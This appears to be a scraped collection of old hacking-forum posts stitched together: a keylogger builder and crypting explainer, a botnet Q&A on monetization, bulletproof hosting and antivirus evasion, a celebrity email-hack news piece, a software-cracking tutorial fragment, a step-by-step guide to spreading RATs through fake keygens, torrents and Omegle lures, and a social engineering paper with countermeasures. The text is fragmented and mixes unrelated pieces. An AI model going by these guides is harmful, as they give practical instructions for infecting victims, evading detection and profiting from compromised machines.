[COLOR=\""#00FF00\""]WHAT IS THE \""SERVER\""     A server is the ouptput of your keylogging builder. It takes your user information (the builder) and the actual malicious code (the stub) and merges the two (via either CodeDOM which Ill explain later in this section, or by filesplitting, which I will also cover) to make one bad ass file. There are several ways that this is accomplished, and both ways have their ups and downs. The server is also what you distribute to infect people. It is your \""virus\""[/COLOR]     [COLOR=\""#FFFF00\""]CodeDom is a type of building that generates the code during runtime. This allows the user to only have to download one file (just a builder). After inputting your information, the builder will take this and combine it with the malicious code (already inside the builder). This helps lower detection rates, but overall is harder to do, and is harder to reFUD (you have to re distribute the entire builder, instead of just providing another stub). [/COLOR]     [COLOR=\""#FF0000\""]Filesplitting is the old school way to do things. It requries taking your information (the builder) and combining it with a separate file that contains the malicious code. While this makes it easier to detect, its easier to update as you can simply give your users another file (same thing, just with less detections). [/COLOR]     [COLOR=\""#00FFFF\""]WHAT IS CRYPTING ?     Crypting can be very complex, though it isnt necessary for you to know all of this information. So for this section Ill keep things to what you need to know. Crypting involves taking a stub (sometimes its CodeDOM) and using that to FUD (or lower your detection rate) your file. The entire process can get a bit confusing, and I wont bother getting into it. What you do need to know is that crypting can easily corrupt your keylogging sever making it no longer work. A corrupt keylogger may not be detected (the crypter at least did its job) but it will not send logs making it useless. Because of this you should chose your crypters carefully and it may take a while to find one that works (for free) with your keylogging server. If you are buying a crypter (which I recommend) then be sure to ask the seller to either test or verify your server. In short, crypting is used to lower detection rate, and raise execution rates. Thats all you need to know.  [/COLOR] :cool::cool: """
0	b0tn3t Q&amp;A-guide!!	"""    Botnet Q&A - The majority of answers are finally here !     [COLOR=\""#00FF00\""]This is created for those are confused or want to do a bit of research. Are you tired looking for answers ? Well if so, you came to right place.     Educational purposes only     What will this tutorial include ?[/COLOR]         [COLOR=\""#FFFF00\""]What is a botnet ?         What are botnets made for ?         How can you monetize/profit from them ?         Where to host them ?         Known DDoS Bots ?         How do cyber criminals get away with them ?         How do people get so many \""bots/installs\"" ?         Types of botnets ?         What are honeypots ?         Anonymous scanning ?         Crypting my bin, making it undetectable ?[/COLOR]   Topic 1 - What is a botnet ?     A botnet is a network of compromised computers, we call them zombies. The bot master can control all the computers using his command & control server where he can initiate various commands. He usually controls them via standards-based network protocols such as IRC and http. Most bot masters use IRC since its much more secure, but I personally prefer HTTP since its easier to control and manage in my opinion. If your too paranoid you should go with IRC, but beware ! If the feds want to get it, they will. To extend your knowledge I suggest visiting this article:  http://en.wikipedia.org/wiki/Botnet  !   Topic 2 - What are botnets made for ?     There are several purposes. Some people want to earn money, and they usually make a living by either coding them or using them to send spam,steal information, etc. Other people want to simply prove that they can, and brag about there abilities. They are made to either steal financial information, such as bank accounts, credit card details and other sensitive details. They are called banking bots, however I do not want to go into detail since this activity is disallowed. Some bots only have DDoS functions, used to launch DDoS attacks ( The majority of DDoS bots are HTTP-Based ). People either offer services once again to gain funds, others just do it for \""pixels\"" to gain fame on the internet. Other bots send spam, and I recently noticed some bots that can turn them into socks, that can be very profitable since there is a high demand for private socks on the blackmarket. So theres 2 options and its your call, either money or fame. Extend your knowledge in this aspect, I suggest you to visit this:  http://www.securelist.com/en/analysis/20...t_business  !   Topic 3 - How can you monetize/profit from them ?     Plenty of options, the most important is that you either have a large amount of bots or high quality countries, such as: US,UK,CA,AUS,FR and several other EU countries. Why high quality countries ? Since there is a thing called \""PPI\"" ( Pay Per Install ). They demand the best countries, since there is more chance to advertise and the specs are better, unlike Pakistan and Indonesia for example. Sending spam. This is the most common use for botnets, and is also one of the simplest. Experts estimate that over 80% of spam is sent from zombie computers. It should be noted that spam is not always sent by botnet owners: botnets are often rented by spammers. Its the spammers who understand the real value of botnets. According to our data, an average spammer makes $50,000 Ã¢â¬â $100,000 a year. Botnets made up of thousands of computers allow spammers to send millions of messages from infected machines within a very short space of time. DDoS attacks. Even here you can see that users profit, if you go the \"" Service Offerings \"" you could see plenty, but the majority of them simply buy 10 booters and think they run the scene. An experienced user would rather go with a private bot, for example: Dirt Jumper ( wich has been cracked ) is a really powerful tool made for websites, Pandora DDoS Bot ( notorious bot, some people say its good others give bad feedback ), G-Bot and more, most of you know these since I have seen a lot of topics where people were trying to set them up. This might be interesting ! : And how can I miss bitcoins, ah. This is probably the easiest way to profit from your net, by running a miner which will complete tasks, and it will generate \"" BTC \"". Most pools payout via PayPal so its much easier to collect revenue. Note to get the best performance it is better to enable GPU, computers with ATI Radeon cards will generate more money, so watch out ! Luckily I have found an estimated earnings scheme for bot masters who do this activity.    [COLOR=\""#FFFF00\""] Botnet mining per day     Bots Bot earnings per day Total earnings     100 x $0.03 $3     1,000 x $0.03 $30     10,000 x $0.03 $300     100,000 x $0.03 $3,000     Botnet mining per week     Bots Bot earnings per week Total earnings     100 x $0.23 $23     1,000 x $0.23 $230     10,000 x $0.23 $2,300     100,000 x $0.23 $23,000     Botnet mining per month     Bots Bot earnings per month Total earnings     100 x $0.97 $97     1,000 x $0.97 $970     10,000 x $0.97 $9,700     100,000 x $0.97 $97,000[/COLOR]     [COLOR=\""#00FF00\""]I would say that isnt bad at all, say if I had 200 000 bots, I would probably work from home . [/COLOR]   Topic 4 - Where to host them ?     It all depends. Say if you just wanted a small net, you would usually go with an offshore VPS ( I do not advise shared hosting ), make sure it isnt located in the US/UK & Germany and your all good. The best countries are probably: China, Taiwan, Iran, Ukraine, Singapore. Russia is \""ok\"", they also have some strict laws, I do not understand why most users think that russian providers have immunity, that is not true. If your on a budget you could always hack a box, and host it there. But blame yourself once you get yourself removed, and all your database will be deleted, including your bots. Some users go advanced, if your hosting a large botnet and stealing details there is so called \""BulletProof Hosting\"" which ignores all reports abuse, including DMCA, spamhaus, etc. You want a bulletproof host ? Well tough luck, shared hosting goes for more than a 100 bucks, and servers end at 800$. Really expensive, so your best call is to simply get an offshore location.   Topic 5 - Known DDoS Bots ?     I have stated a bit of information in another thread, I know most of you want a DDoS bot simply because with a press of a button you can cause massive chaos, and its possible. One of the strongest DDoS bot is Dirt Jumer, which is created specifically created to attack websites, methods such as: HTTP GET ( Sends GET requests ) - harder to block, HTTP POST, Synchronous Flood, Download Flood and an Anti-DDoS flood. The best thing I like about most bots these days is that they have random user agents, and change http headers and pretend to be legitimate traffic, that is really smart from the coders side, but they are usually really unstable, you would rather have a \""loader\"" which is a type of bot which is really stable, you usually hold bots and it can act as a backbone for the DDoS bot, so you would 2 benefits, stability and power.   Topic 6 - How do cyber criminals get away with them ?     There are several methods, such as bulletproof hosting, which I already stated, and a common but interesting method which large botnets use it FastFlux, most of you do not know what that is and I suggest you to read. Fast flux is a DNS technique used by botnets to hide phishing and malware delivery sites behind an ever-changing network of compromised hosts acting as proxies. It can also refer to the combination of peer-to-peer networking, distributed command and control, web-based load balancing and proxy redirection used to make malware networks more resistant to discovery and counter-measures. The Storm Worm is one of the recent malware variants to make use of this technique.     The basic idea behind Fast flux is to have numerous IP addresses associated with a single fully qualified domain name, where the IP addresses are swapped in and out with extremely high frequency, through changing DNS records.   - Credits to wikipedia.     Obviously you wouldnt have that if your starting off, so what I would suggest to do, is simply get a cheap VPS, with 128mb of ram and setup a reverse proxy, that will work for you. These are probably the only methods I know at the moment.   Topic 7 - How do people get so many \""bots/installs\"" ?     This is interesting, many of you have wondered how people get so many bots and sell them, thousands ! Thats right, thousands. They either have some next \""ub3r\"" spreading skills, which they dont or they buy an exploit kit. What is an exploit kit ? Its a type of crime ware which scans the computer for un-patched exploits, you could say its a Silent Driveby, but only say 10% will download the file, so thats why they get bulk traffic (real visitors) and send it to their exploit link, then some percentage % of the traffic gets generated into installs. Usually people get low quality countries such as: Pakistan, Indonesia, Egypt since they dont know what an anti-virus is and they have pirated version of windows. Your probably interested, but the cheapest packs go for 600$ monthly, but its a wise investment, of course if you know what your doing.   Most common exploit kit:   http://www.webopedia.com/TERM/B/blackhol...t_kit.html   List of exploit kits:   http://cyb3rsleuth.blogspot.co.uk/search...oit%20Kits     [COLOR=\""#00FFFF\""]Topic 8 - Types of botnets ? [/COLOR]    [COLOR=\""#00FF00\""] DDoS Bots - To initiate DDoS attacks on servers.     Banking Bots - Identity theft. ( Dont want to go into detail )     Spam Bots - To send out spam.     Socks Bots - To create socks4/socks5 proxies.     BitCoin Bots - To generate a virtual currency called \"" BTC \"".     Loaders - To hold bots in a stable environment.[/COLOR]   Topic 9 -What are honeypots ?     What is a honeypot, if you consider getting into botnets you should know. If you catch a honeypot, it would probably be some experienced user who wants to trace your botnet, or another hacker who wants to get into your botnet and steal some bots or a pig. Once you catch a honeypot, your bot will be analyzed and it will be traced. The incoming packets will be sniffed and your panel could be easily compromised within seconds. Thats about it for you to know, theres not much you can say and do about it. . [COLOR=\""#FFFF00\""]     A really useful resource:[/COLOR]   http://www.exposedbotnets.com/     [COLOR=\""#0000FF\""]I suggest everyone to visit, and you would understand how it works. [/COLOR]   Topic 10 - Anonymous scanning ?     Some of you simply scan with novirusthanks, or virustotal. That is probably the most wrong thing to do in your journey, never ever scan with them unless you want your files detected. I would strongly recommend anonymous scanning servers, those who dont distribute your file to the AV companies, so once its scanned it wont be analyzed by anyone. I recommend the following services:   http://www.scan4you.net   http://www.elementscanner.su   Those are the 2 I know, and I can assure that you will receive quality scanning services with them.   Topic 11 - Crypting my bin, making it undetectable ?     This is important, most bins will be detected by most anti-viruses, and we do not want that, since there will be a lower % of executions from the installs we either purchase or spread. I strongly recommend crypters coded in native languages, since the stubs are usually smaller and the execution rate will be higher, however if your looking for long-lasting stubs you would rather go with a Visual Basic stubs, since it doesnt look that suspicious. I recommend: Father Crypter, Root Crypt. I havent seen decent crypters here, but I heard some good feedback about: cloudcrypter.net. Remember to run an update on your bots on a regular basis, so you wont loose any machines.

2	Hacker Attack Email Account Kareena Kapoor, Ekta Kapoor, Arbaaz Khan and Sajid Khan	"""   Hacker Attack Email Account Kareena Kapoor, Ekta Kapoor, Arbaaz Khan and Sajid Khan There is nothing new when celebrities’ email accounts get hacked! For  virtually every month, celebrities make headlines when hackers spy on  their email accounts, misuse it and leak their personal details. So when  Sajid Khan hit headlines when his account was compromised, we were  shocked! Initially, he didn’t pay much attention to it because he  thought he wasn’t interested in email and social networking websites.  But when his friends started calling him up, he realized how serious the  problem had become. The hacker used his account to send mails to  actresses asking them for their high-res nude pictures! This isn’t the first time that we have heard of such an instance. In  the past too celebrities like Ekta Kapoor, Meghna Naidu, Ali Merchant,  Arbaaz Khan have faced similar problems. But what’s disturbing is the  spurt in the number of such incidents! For it shows how ridiculously  simple it is to break into their emails and extremely difficult to catch  hold of culprits. Here’s a list of celebrities who are having a bad time dealing with the menace of leaked personal details: Meghna Naidu: She filed a police complaint saying that her email id  has been hacked. The hacker was trying to malign her image by writing  obscene mails to her friends. She said, “The hacker used my gmail  account to chat with my friends and even said that I am pregnant and  wanted to go for an abortion. The fraud wrote all such obscene things  about me.”ÃÂ Ekta Kapoor: Her email account too got hacked and the hackers sent  false messages to her friends through her mail. An insider revealed that  Ekta came to know that her email was hacked when she started receiving  phone calls from her friends. They said that they received email from  her where they have been asked to pay Rs 11,000 if they wished to get  audition for her shows. On hearing this, she was shocked. Arbaaz Khan: “My email account has been hacked for the 2nd time in 7  days. I’m gonna file a complaint with the cyber cell as its a unlawful  act,” Arbaaz submited on the microblogging site Twitter. “Hackers don’t  look to realise that such an offense can land them in lockup.

Kareena Kapoor: On returning from Morocco with beau Saif Ali Khan,  after completing the schedule of “Agent Vinod”, Kareena Kapoor was  shocked to find how her personal e-mail id had been hacked into. “When  she returned to India, the first thing she wanted to do was check her  e-mails. But she couldn’t log into her account despite several attempts.  That’s when she realised that her e-mail account had been hacked into.

IDM is the best Internet download manager available on internet but its not free and its cracked or patched versions contains viruses. Using this hack you can register the Internet Download Manager (IDM) for free using you own credentials i.e register on your Name and email ID. I am explaining the manual hacking method because most of my users said that patch and keygen contain viruses. Now suppose you have updated your IDM (Internet Download Manager) and if you are using cracked or patched version, after updating IDM, it shows an error message that you have registered IDM using fake serial key. And after that IDM exits and hence it doesnt download anything. This hack also works for trail IDM that means download a trail IDM from there site and register the professional i.e. full version of IDM with your credentials for free using my hack. Lets start the tutorial,  How to hack or crack IDM manually. Steps Involved : Step 1 : Download the IDM trial or If you already have IDM installed Update it by going to Help---}} then to check for Updates.

0	[Tutorial] Epic RAT Spreading Guide | Detailed Methods [Tutorial]	"""   [Tutorial] Epic RAT Spreading Guide | Detailed Methods  [Tutorial]   Presents: In the last time i saw a lot of people asking for help with spreading there keylogger or there RAT. Now i decided to make a huge tutorial on spreading to help the community. I will start with very basic and famous stuff like youtube and also a few advanced methods. General Things you need: a RAT (ready set-up, make sure its working) a crypter (you will get a lot more victims if your server is FUD) a filehost (for example fileave or dropbox) a computer a brain would not be bad ;D Methods: 1). Youtube In my opinion the most famous and easiest method. It is great if you want to target a special group like people with special accounts, for example steam. 1. Go to youtube.com and register a account if not allready done. 2. In my example i will target people with steam accounts, so i look for  some videos with the title \""Steam Hack\"" or \""Black Ops Hack/Keygen\"" or  something like that. You also can look for a paypal hack video, you will  find something you like. 3. When you found a good video, go to keephd.com and download the video in your preferred quality. 4. Then go back to youtube and upload the downloaded video. 5. While uploading, think about an attractiv title for the video, for  example \""Black Ops Keygen 100% Working !!!\"". In the description put a  small text, for example a readme and your server.exe download link. 6. When its uploaded your done. Tips: -At the beginning your views and downloads will only increase slowly but they raise fast and you get a good amount of downloads. - It can help to use a youtube bot to increase views, thumps up etc. to  make your video more legit looking, or ask a few friends you haveBiggrin 2). Forums First of all i dont mean hackforums.net !!!! I dont want anybody posting malware here !!! In my opinion its another simple method. There are alot of big and activ forum to post some malware. The best choice are forums with a lot of young members because they  download everything they can get and that sounds cool and interesting (i  am talking from my own experienceBiggrin). 1. Look for a big forum on google. It will come up a lot of them, i  would take one from the first google page. Easiest Forums to spread are  gaming/cheating forums because most of them are kids or teenager. 2. Create a new account there with a cool username ( it should look trusting, not \""l33t-haxxor\"" or \""i hack you\"" ). 3. Design your profile with avatar, signature, some fake details like you want. 4. Make some HQ threads to catch the members attention and make you looking more trusted. 5. After a time make a new thread about a new simple UD wallhack or a  working keygen you coded in the last time. Make the thread attractiv and  detailed to catch the readers eye. You should add a detailed feature  list, screenshots and maybe a short video. 6.You are done. Wait for the first kids downloading your file. Tips: - Make multiple accounts to answer to your thread and vouch for you.  These account should also look legit to the others, so not 1 time  posters or joined 1 minute before. 3). Torrents Another Easy method that will get some easy Bots for you. 1. Download a torrent program like BitTorrent here: \""Guests cannot see  links in the messages. Please register to forum by clicking HERE to the  see links.\"" 2. Install BitTorrent if not allready done 3. Go to file -> Create new Torrent 4. Look for your file and select it. Now a new torrent with your file will be created. 5. Go to a famous torrent site like Piratebay.org 6. Upload your new torrent to the site with a detailed description. As  title choose something like a paypal hack or a BF3 Beta keygen,  something that will attract many people. 4). Omegle This is more complicated because you dont get that many downloads, you have to work for each one. There are diffrent omegle methods, you only can post your server link to  each of them and say its a photo package, but thats not working good. I give you a better method. I think many will know it: 1. Download the program ManyCam which allows you to use a virtual webcam. 2. Install Manycam 3. Download this video pack of a girl. It can wave and do some other  things. Download: \""Guests cannot see links in the messages. Please  register to forum by clicking HERE to the see links.\"" (this is not my video package, but i used it a few times. Thanks to whoever posted thisBiggrin) 4. Start omegle, ss soon as you get into a conversation with somebody go  to your many cam and start the Wave clip.. So it waves at the person  and looks very legit. 5. Start a conversationen about some normal things with him/her. 6. After that ask if he/she wants to see some pictures. 7. Sent him your server.exe or your JavaDriveBy and your done if he opened it. Tips: - If you fail, you can retry as often as you want - You should replace the server.exe icon with a jpg icon and may hide the file ending to make it more legit. 5). JavaDriveBy JavaDriveBys are great. You put them on a site and everyone who visits  this site download a hidden file and executes it. If your server is FUD,  Most people will not notice something is wrong. I will present you a very simple java drive by, you can search the forums to find more advanced ones. 1. Go to dot.tk 2. In the URL field enter your direct server link. 3. After loading the url, you can change the name of the url to  something good looking, for example \""paypal-hack.tk\"" or  \""naughty-nude-girls.tk\"". 4. After getting this link you can spread it everywhere you want. Tips: -You can spread this with the help of other methods in this tutorial.  Say you made a cool new website with a lot of hacking tools and software  or you want to show your new website and the people will click on it  because they are interested on your site. 6). PTC Sites PTC sites are sites that pay you for visiting links or sites for a short time. For this method we will use a JavaDriveBy that we will advertise on a  PTC site for a low amount of money. You will get 2000 views on your link  for only $1 1. First of all make your JavaDriveBy ready to work. 2. Then look for a big PTC company. Many of them are scam, but there are a few ones that are ok. I take the site paidtoclick.in 3. Make a new account there and make it ready to work. 4. Click on the advertise button 5. Click on the \""Buy Now\"" Button besides the \""Link ad Hits\"". Try with $1 6. Create a new link with a title you want, for example money making software or something like that. 7. Put your JavaDriveBy into the target URl field. Leave the rest blank. 8. Then pay for it and wait for the victims Biggrin tips: -The more money you invest the more victims you get. -Try to do it on diffrent PTC sites that are activ. 7). Auto Spreader Auto Spreaders or worms are a helpful thing in spreading. You put your file on a little server and it spreads itself from every slave to other people. Many worms use facebook, msn, 4chan and other communities or chat programs to spread itself. You can spread your worm with the help of the methods above and you will multiple your victims and spreading work. Thanks for reading my Guide, please post a little feedback or give me stuff to edit or make better.  Enjoy . ~ NE0 - H4X0R - !ND!A ~    """

Hidden Content:  You must reply to see links  for the year 2010-2011 stated that  almost half of the respondents had experienced a security incident,  with 45.6% of them reporting that they had been subject of at least  one  targeted attack. [/TD] [/TR] [/TABLE] [TABLE] [TR] [TD=\""align: justify\""]Merely trying to prevent infiltration on a technical level and  ignoring the physical-social level, cent percent security can never  be achieved. Couple of examples can be the scenes from Hackers which  shows Dumpster diving in the target companys trash in order to  obtain financial data from printouts and the scene from War Games  where Matthew Brodericks character studied his target before  attempting to crack the password of the military computer system.   Social Engineering  is a threat that is overlooked in most of the  organizations but can easily be exploited as it takes advantage of  human psychology rather than the technical barricades that surrounds  the complete system. Below is a classic example of this: A  person receives an e-mail on his official mailbox saying that his  computer has been infected with a virus. The message provides a link  and suggests that he downloads and installs the tool from the link  to eliminate the virus from his computer. The person in a state of  confusion clicks on the link to remove the virus from his computer  but unwittingly giving a hacker an easy entrance into his corporate  network. To ensure complete security of an organization from all  kinds of internal and external factors, the security consultant must  have complete knowledge of the Social Engineering cycle, the  techniques that can be used by an attacker and the counter-measures  to reduce the likelihood of success of the attack. In this  paper we are going to take you through the various phases so as to  understand what is Social Engineering, Social Engineering Lifecycle,  the various Techniques used in Social Engineering attack with  detailed examples and then finally conclude with the  counter-measures to protect against each of the Social Engineering  attack techniques.[/TD]  [/TR]     [TR]  [TD=\""align: left\""]   [/TD]  [/TR]       [TR]  [TD=\""align: left\""]   [/TD]  [/TR]       [TR]  [TD=\""align: left\""]   [/TD]  [/TR]       [TR]  [TD=\""class: page_subheader\""]Definition(s) of Social Engineering [/TD] [/TR] [/TABLE] [TABLE] [TR] [TD=\""align: justify\""]The term  \""Social Engineering\""  can be  defined in various ways, relating to both physical and cyber aspects of  that activity. Wikipedia defines social engineering as: \"" ...the  art of manipulating people into performing actions or divulging  confidential information\"". Other authors have provided the  following definitions: \""An outside hackers use of psychological  tricks on legitimate users of a computer system, in order to obtain  information he needs to gain access to the system\"". \"" The practice  of deceiving someone, either in person, over the phone, or using a  computer, with the express intent of breaching some level of security  either personal or professional\"". \""Social Engineering is a  non-technical kind of intrusion relying heavily on human interaction  which often involves tricking other people into breaking normal security  procedures\"" the attacker uses social skills and human interaction to  obtain information about an organization or their computer systems. In reality Social Engineering can be any of these definitions  depending on the circumstances that surround the attack. Social  Engineering is actually a hacker?s manipulation of the natural human  tendency to trust so as to get sensitive information needed to gain  access to a system. Social Engineering does not require high level of  technical expertise but requires the individual to have decent social  skills. Many people, for several decades have used social engineering  as a method to research and collect data. These early social engineers  would use the gathered information as a form of blackmail against the  other organizations. Social engineering has been used to gain   unauthorized access  into several huge organizations. A hacker who spends  several hours trying to break passwords could save a great deal of time  by calling up an employee of the organization, posing as a helpdesk or  IT employee, and can just asking for it.[/TD]  [/TR]   [TR]  [TD] [/TD]  [/TR]   [TR]  [TD]  [/TD]  [/TR]  [TR]  [TD] [/TD]  [/TR]  [TR]  [TD=\""class: page_subheader\""]The Social  Engineering Life Cycle [/TD]  [/TR]  [TR]  [TD]  [/TD]  [/TR]   [TR]   [TD=\""align: justify\""]Every Social Engineering attack is  unique, but with a little understanding of the situations encountered,  we can draft a rough cycle of all the activities that a Social  Engineering project goes through leading to a successful outcome. The below figure shows a general representation of the  Social  Engineering Life Cycle  in four main stages:[/TD] [/TR] [/TABLE]   [TABLE] [TR] [TD=\""class: page_sub_subheader\""]1. Footprinting[/TD]  [/TR]   [TR]  [TD][/TD]  [/TR]   [TR]  [TD]It is the technique of accumulating  information regarding the target(s) and the surrounding environment.  Footprinting can reveal the individuals related to the target with whom  the attacker has to establish a relationship, so as to improve the  chances of a successful attack. The information gathering during  the Footprinting phase includes but is not limited to: [/TD]  [/TR]   [TR]  [TD]  List of employee names and phone numbers Organization Chart Department Information Location  information  [/TD]  [/TR]   [TR]   [TD]Footprinting generally refers to one of the pre-attack phases;  tasks performed prior to doing the actual Social Engineering attack. Some of the tools like creepy,  SET and  Maltego make Social Engineering  engagements easier. [/TD]  [/TR]   [TR]  [TD]  [/TD]  [/TR]   [TR]  [TD] [/TD]  [/TR]   [TR]   [TD=\""class: page_sub_subheader\""]2.Establishing Trust [/TD]  [/TR]   [TR]  [TD][/TD]  [/TR]   [TR]  [TD]Once the possible targets have been listed  out, the attacker then moves on to develop a relationship with the  target who is usually an employee or someone working in the business so  as to develop a good rapport with them. The trust that the social  engineer is gaining will later be used to unveil confidential pieces of  information that could cause severe harm to the business. [/TD]  [/TR]   [TR]  [TD] [/TD]  [/TR]   [TR]  [TD] [/TD]  [/TR]   [TR]   [TD=\""class: page_sub_subheader\""]3. Psychological Manipulation[/TD]  [/TR]   [TR]  [TD][/TD]  [/TR]   [TR]  [TD]In this step, the social engineer manipulates  the trust that he has gained in the previous phase so as to extract as  much confidential information or get sensitive operations related to the  target system performed by the employee himself so as to penetrate into  the system with much ease. Once all the required sensitive  information has been collected, the social engineer may move on to the  next target or move towards exploiting the actual system under  consideration. [/TD]  [/TR]   [TR]   [TD][/TD]  [/TR]   [TR]   [TD] [/TD]  [/TR]   [TR]   [TD=\""class: page_sub_subheader\""]4. The Exit[/TD]  [/TR]   [TR]  [TD][/TD]  [/TR]   [TR]  [TD]Now, after all the actual information has been  extracted, the Social Engineer has to make a clear exit in such a way so  as not to divert any kind of unnecessary suspicion to himself. He  makes sure to not leave any kind of proof of his visit that could lead a  trace-back to his real identity nor link him to the unauthorized entry  into the target system in the future. [/TD]  [/TR]   [TR]   [TD] [/TD]  [/TR]   [TR]  [TD]  [/TD]  [/TR]   [TR]  [TD] [/TD]  [/TR]   [TR]   [TD=\""class: page_subheader\""]The Human Behavior[/TD]  [/TR]   [TR]  [TD]  [/TD]  [/TR]   [TR]  [TD]Every  Social Engineer  targets specific  behavioral traits in the victim so as to extract maximum information out  of him. These behavioral traits include but are not limited to:[/TD]  [/TR]   [TR]   [TD=\""align: justify\""]  Excitement of Victory Mr. X gets an e-mail  stating, \""You have won 1 Million Dollars and to claim the winning  amount, fill in the attached document and forward it to the email  id:  [email protected] /* &lt;![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName(script),e=t.length;e--;)if(t[e].getAttribute(data-cfhash))return t[e]}();if(t&amp;&amp;(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute(data-cfemail)){for(e=,r=0x+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+=%+(0+(0x+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]&gt; */ . Switch off your antivirus as it may block the  download due to highly encrypted Digital Signature of the  documents\"". Out of Excitement he switches off his Antivirus and  proceeds as ordered and downloads the document and opens it but  finds it corrupted. Little does he know that he has just downloaded  a malware on his machine which allows the email sender to gain  remote access to his machine. Fear of Authority Many people are  apprehensive in the presence of someone they perceive as an  authority figure, it is not that person they are apprehensive about  but most likely the position and power of the person that  intimidates them and makes them. The attackers take on roles of  authority figures such as law enforcement officers or high-ranking  company officials to extract sensitive organizational information  from the victims. Desire to be helpful Keith A. Rhodes,  chief technologist at the U.S. General Accounting Office, which has  a Congressional mandate to test the network security at 24 different  government agencies and departments said in one of his interviews  that, \""Companies train their people to be helpful, but they rarely  train them to be part of the security process. We use the social  connection between people, their desire to be helpful.\"" People in  their desire to be helpful and to solve other peoples queries, give  out a lot of information that otherwise should not be disclosed to  an outsider as it could give an attacker a chance to get  unauthorized access to the target system causing a possible loss. Fear of Loss Mr. X gets an e-mail  stating, \""You have won 1 Million Dollars and to claim the winning  amount, deposit $75,000 in Account number: XXXXXX in 10 days from  receiving this e-mail, failing to which the winning amount would be  declared unclaimed and there would be a nee lucky-draw to decide the  next winner\"". Out of fear that he might lose such a good opportunity, he deposits the amount to the account number provided.  When his future replies to the e-mail address goes unanswered for  the next two months nor does the 1 Million Dollar gets deposited to  his account, he understands that he has been scammed. Laziness All of us have come across  some or the other job that requires us to do only a specified set of  activities and not linger around looking for better ways of doing  that activity. This causes boredom to the person who performs the  same task repeatedly on daily basis and over the time learns  \""shortcuts\"" to do the tasks using minimal efforts and still meeting  the targets. Such individuals over a period of time become lazy and  are susceptible to attackers who target such individuals as they  know that they would get the required information with much ease due  to the laid back attitude of these individuals towards their work. Ego Many a times, the attacker makes  the person more emotionally sure of himself/herself and thus  removing the logical awareness of the security breach that is  occurring. The result is that, the person being hacked senses no  harm in providing whatever it is that the attacker is requesting.  The reason that such an attack succeeds is that the attacker is a  receptive audience for victims to display how much knowledge they  have. Insufficient knowledge Knowledge about  the target system is one of the key factors that differentiate the  attacker from other employees of the organization. Many a times, due  to lack of proper training, the employees are themselves not sure if  they have complete knowledge about the product and Social Engineers  take advantage of such situations by creating a sense of urgency and  not allowing the employee much time to think and understanding the  fact that they are under attack.  [/TD]  [/TR]   [TR]  [TD]  [/TD]  [/TR]   [TR]  [TD]  [/TD]  [/TR]   [TR]   [TD=\""class: page_subheader\""]The Weapons of a Social Engineer [/TD]   [/TR]      [TR]   [TD] [/TD]   [/TR]      [TR]   [TD=\""align: justify\""]The old-fashioned technical way of breaking  into the computer systems by brute-forcing the user logins or ports have  now been replaced by sophisticated methods that not only are easier, but  yield better and faster results based on  human psychology . These attacks  can help the attacker get access to any system irrespective of the  platform, software or hardware involved. How exactly goes a  person to carry out Social Engineering attack? The figure below shows  some of the most popular techniques used to perform a Social Engineering  attack:[/TD] [/TR] [/TABLE] [TABLE] [TR] [TD=\""align: justify\""] Shoulder Surfing Shoulder surfing is a  security attack where-in, the attacker uses observational  techniques, such as looking over someones shoulder, to get  information while they are performing some action that involves  explicit usage of sensitive, visible information. This can be  performed at a close range as well as at a long range using  binoculars or other vision-enhancing devices. Dumpster Diving Many a times, huge  organizations dump items like company phone books, system manuals,  organizational charts, company policy manuals, calendars of  meetings, events and vacations, printouts of sensitive data or login  names and passwords, printouts of source code, disks and tapes,  company letterhead and memo forms, and outdated hardware carelessly  into the company dumpsters. The attacker can use these items to get  a huge amount of information about the company organization and  network structure. This method of searching through the dumpster, looking for  potentially useful information discarded by a company?s employees is  known as Dumpster Diving. Role playing It is one of the key  weapons for a Social Engineer. It involves persuading or gathering  information through the use of an online chat session, emails, phone  or any other method that your company uses to interact online with  the public, pretending to be a helpdesk, employee, technician,  helpless or an important user to divulge in confidential  information. Trojan horses It is one of the most  predominant methods currently used by hackers that involve tricking  the victims to download a malicious file to the system, which on  execution creates a backdoor in the machine that can be used by the  attacker any time in the future and thus having complete access of  the victim?s machine. Phishing It is the act of creating and  using Websites and e-mails designed to look like those of well-known  legitimate businesses, financial institutions and government  agencies to deceive Internet users into disclosing their personal  information and falsely claiming to be an established legitimate  enterprise in an attempt to scam the user into surrendering private  information that will be used for identity theft. Surfing Organization Websites & Online forums Huge amount of information regarding the organization  structure, email ids, phone numbers are available openly on the  company website and other forums. This information can be used by  the attacker to refine his approach and create a plan on whom to  target and the method to be used. Reverse Social Engineering A reverse  social engineering attack is an attack in which an attacker  convinces the target that he has a problem or might have a certain  problem in the future and that the attacker, is ready to help solve  the problem. Reverse social engineering involves three parts: Sabotage:  After the attacker gains a simple access  to the system, he corrupts the system or gives it an appearance of being  corrupted. When the user sees the system in the corrupted state, he  starts looking for help so as to solve the problem. Marketing:  In order to make sure that the user  approaches the attacker with the problem, the attacker advertises  himself as the only person who can solve the problem. Support:  In this step, he gains the trust of the target and obtains access to sensitive information.

But, there are certain ways to reduce the  likelihood of success of the attack. It is also important for  organizations to establish a clear and strong security policy and  processes to reduce the threat of social engineering. The  following are some of the steps to ensure protection against Social  Engineering attack:[/TD]   [/TR]      [TR]   [TD=\""align: justify\""]  Security Awareness Trainings Security  Awareness is the simplest solution to prevent Social Engineering  attacks. Every person in the organization must be given basic  security awareness training on timely basis that he/she should never  give out any information without the appropriate authorization and  that he/she should report any suspicious behavior. Background Verification There is many  a chance that attacker may join the company as an employee so as to  gather insider information about the company. This makes background  screening a really important part of company policies to counter  Social Engineering attack. It should not only be limited to internal  employees but must also be extended to vendors and other contractual  workers too before they become the part of the organization or are  given access to the organization network. Physical security There should be proper  access control mechanism in place to make sure that only authorized  people are allowed access to restricted sections of the  organization. There should be no tail-tagging. Limited data leakage There should be  constant monitoring as to what all information about the  organization is floating on the World Wide Web. Any kind of  irregularity should be immediately taken care of. This will make  passive information gathering difficult for the attacker. Mock Social Engineering drills Special  Social Engineering activities should be performed on the internal  employees of the organization by either the security team or by the  vendor so as to keep track of the security awareness levels in the  organization. Data Classification policy There  should be proper classification of data on the basis of their  criticality levels and the access personnel. Data classification  assigns a level of sensitivity to company information. Each level of  data classification includes different rules for 